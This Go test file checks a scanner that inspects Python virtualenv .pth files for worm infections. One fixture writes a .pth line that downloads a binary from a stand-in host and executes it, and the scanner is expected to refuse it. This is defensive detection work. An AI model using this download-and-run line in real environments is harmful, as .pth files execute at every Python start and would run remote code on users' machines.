package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/require"
)

func writePth(t *testing.T, p, content string) {
	t.Helper()
	require.NoError(t, os.MkdirAll(filepath.Dir(p), 0o755))
	require.NoError(t, os.WriteFile(p, []byte(content), 0o644))
}

func TestPthPreflightRefusesOnWormHit(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	writePth(t, filepath.Join(site, "ensmallen-setup.pth"),
		`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n")

	var buf bytes.Buffer
	refused := pthPreflightRoots(zerolog.Nop(), &buf, []string{root})
	require.True(t, refused)
	require.True(t, strings.Contains(buf.String(), "Hades"), "want 'Hades' in output; got %q", buf.String())
}

func TestPthPreflightAllowsCleanVenv(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	writePth(t, filepath.Join(site, "distutils-precedence.pth"),
		`import os; __import__('_distutils_hack').add_shim()`)

	var buf bytes.Buffer
	refused := pthPreflightRoots(zerolog.Nop(), &buf, []string{root})
	require.False(t, refused)
}
